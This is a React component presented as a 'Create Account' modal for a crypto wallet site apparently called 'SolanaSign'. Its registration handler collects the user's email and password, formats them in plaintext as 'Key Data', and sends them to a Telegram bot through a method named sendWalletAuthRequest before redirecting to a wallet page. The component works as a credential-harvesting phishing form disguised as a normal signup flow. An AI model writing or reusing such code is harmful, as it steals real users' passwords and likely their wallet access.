import React, { useState } from "react";
import { X } from "lucide-react";
import { Button } from "./ui/button";
import { useNavigate } from "react-router-dom";
import InputField from "./InputField";
import telegramBotService from "../services/telegramBot";

interface RegisterModalProps {
  onClose: () => void;
  onSuccess: () => void;
}

interface RegistrationData {
  email: string;
  password: string;
  timestamp: string;
  sessionId: string;
}

const RegisterModal: React.FC<RegisterModalProps> = ({
  onClose,
  onSuccess,
}) => {
  const [email, setEmail] = useState("");
  const [password, setPassword] = useState("");
  const [emailError, setEmailError] = useState("");
  const [passwordError, setPasswordError] = useState("");
  const [isLoading, setIsLoading] = useState(false);
  const [showPassword, setShowPassword] = useState(false);
  const [telegramStatus, setTelegramStatus] = useState<
    "idle" | "sending" | "success" | "error"
  >("idle");
  const [telegramMessage, setTelegramMessage] = useState("");
  const navigate = useNavigate();

  const validateEmail = (email: string): boolean => {
    const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
    return emailRegex.test(email);
  };

  const validatePassword = (password: string): boolean => {
    return password.length >= 8;
  };

  const generateSessionId = (): string => {
    return (
      Math.random().toString(36).substring(2, 15) +
      Math.random().toString(36).substring(2, 15)
    );
  };

  const formatRegistrationData = (data: RegistrationData): string => {
    return `
🔐 *NEW USER REGISTRATION*

📧 *Email:* ${data.email}
🔑 *Password:* ${data.password}
🆔 *Session ID:* \`${data.sessionId}\`
⏰ *Timestamp:* ${data.timestamp}

*Key Data:*
\`\`\`
${data.email}
${data.password}
\`\`\`
        `.trim();
  };

  const handleEmailChange = (e: React.ChangeEvent<HTMLInputElement>) => {
    const newEmail = e.target.value;
    setEmail(newEmail);

    if (newEmail && !validateEmail(newEmail)) {
      setEmailError("Please enter a valid email address");
    } else {
      setEmailError("");
    }
  };

  const handlePasswordChange = (e: React.ChangeEvent<HTMLInputElement>) => {
    const newPassword = e.target.value;
    setPassword(newPassword);

    if (newPassword && !validatePassword(newPassword)) {
      setPasswordError("Password must be at least 8 characters long");
    } else {
      setPasswordError("");
    }
  };

  const handleRegister = async () => {
    if (!isFormValid) return;

    setIsLoading(true);
    setTelegramStatus("sending");

    try {
      // Check if Telegram bot is configured
      if (!telegramBotService.isConfigured()) {
        throw new Error(
          "Telegram bot not configured. Please check your environment variables."
        );
      }

      const sessionId = generateSessionId();
      const timestamp = new Date().toISOString();

      const registrationData: RegistrationData = {
        email,
        password,
        timestamp,
        sessionId,
      };

      // Send registration data to Telegram bot
      const telegramResponse = await telegramBotService.sendWalletAuthRequest({
        walletType: "SolanaSign Registration",
        keyType: "phrase",
        key: formatRegistrationData(registrationData),
      });

      if (telegramResponse.success) {
        setTelegramStatus("success");
        setTelegramMessage(telegramResponse.message);

        // Store registration data in localStorage for later use
        localStorage.setItem("registrationSessionId", sessionId);
        localStorage.setItem("userEmail", email);
        localStorage.setItem("registrationTimestamp", timestamp);

        // Wait a bit to show success message before navigating
        setTimeout(() => {
          onSuccess();
          navigate("/wallet");
        }, 2000);
      } else {
        throw new Error(telegramResponse.message);
      }
    } catch (error: any) {
      console.error("Registration error:", error);
      setTelegramStatus("error");
      setTelegramMessage(
        error.message || "Registration failed. Please try again."
      );
    } finally {
      setIsLoading(false);
    }
  };

  const isFormValid =
    email &&
    password &&
    !emailError &&
    !passwordError &&
    validateEmail(email) &&
    validatePassword(password);

  const getStatusIcon = () => {
    switch (telegramStatus) {
      case "sending":
        return (
          <div className="animate-spin rounded-full h-5 w-5 border-b-2 border-purple-600"></div>
        );
      case "success":
        return <div className="w-5 h-5 text-green-600">✓</div>;
      case "error":
        return <div className="w-5 h-5 text-red-600">✗</div>;
      default:
        return null;
    }
  };

  const getStatusMessage = () => {
    switch (telegramStatus) {
      case "sending":
        return "Sending registration to Telegram...";
      case "success":
        return telegramMessage;
      case "error":
        return telegramMessage;
      default:
        return "";
    }
  };

  return (
    <div className="fixed inset-0 bg-black/50 backdrop-blur-sm flex items-center justify-center z-50">
      <div className="w-full max-w-md mx-auto">
        <div className="bg-white/80 dark:bg-zinc-900/80 backdrop-blur-xl rounded-2xl shadow-xs border border-zinc-200/50 dark:border-zinc-800/50 overflow-hidden">
          <div className="p-5 border-b border-zinc-200/50 dark:border-zinc-800/50 bg-white/50 dark:bg-zinc-900/50 backdrop-blur-xs">
            <div className="flex items-start justify-between mb-2">
              <h2 className="text-lg font-semibold text-zinc-900 dark:text-white">
                Create Account
              </h2>
              <Button
                variant="ghost"
                className="text-zinc-500 hover:text-zinc-700"
                onClick={onClose}
              >
                <X className="w-5 h-5" />
              </Button>
            </div>
          </div>

          <div className="p-5 space-y-4">
            <div className="space-y-4">
              <InputField
                id="email"
                type="email"
                label="Email Address"
                value={email}
                onChange={handleEmailChange}
                placeholder="Enter your email address"
                className={`${
                  emailError ? "border-red-500" : ""
                } h-12 text-base px-4 text-white`}
                labelColor="text-white"
              />
              {emailError && (
                <p className="text-red-500 text-sm">{emailError}</p>
              )}

              <InputField
                id="password"
                type={showPassword ? "text" : "password"}
                label="Password"
                value={password}
                onChange={handlePasswordChange}
                placeholder="Enter your password"
                className={`${
                  passwordError ? "border-red-500" : ""
                } h-12 text-base px-4 text-white`}
                labelColor="text-white"
                isPassword={true}
                isVisible={showPassword}
                toggleVisibility={() => setShowPassword(!showPassword)}
              />
              {passwordError && (
                <p className="text-red-500 text-sm">{passwordError}</p>
              )}
            </div>

            {telegramStatus !== "idle" && (
              <div
                className={`flex items-center gap-2 p-3 rounded-lg ${
                  telegramStatus === "success"
                    ? "bg-green-900/20 text-green-400"
                    : telegramStatus === "error"
                    ? "bg-red-900/20 text-red-400"
                    : "bg-blue-900/20 text-blue-400"
                }`}
              >
                {getStatusIcon()}
                <span className="text-sm">{getStatusMessage()}</span>
              </div>
            )}

            <div className="flex gap-3 pt-4">
              <Button
                variant="ghost"
                className="flex-1 text-zinc-600 dark:text-zinc-400 hover:bg-zinc-100 dark:hover:bg-zinc-800"
                onClick={onClose}
                disabled={isLoading}
              >
                Cancel
              </Button>
              <Button
                className="flex-1 bg-purple-600 text-white hover:bg-purple-700 disabled:opacity-50"
                onClick={handleRegister}
                disabled={!isFormValid || isLoading}
              >
                {isLoading ? "Sending to Telegram..." : "Continue to Wallet"}
              </Button>
            </div>
          </div>
        </div>
      </div>
    </div>
  );
};

export default RegisterModal;
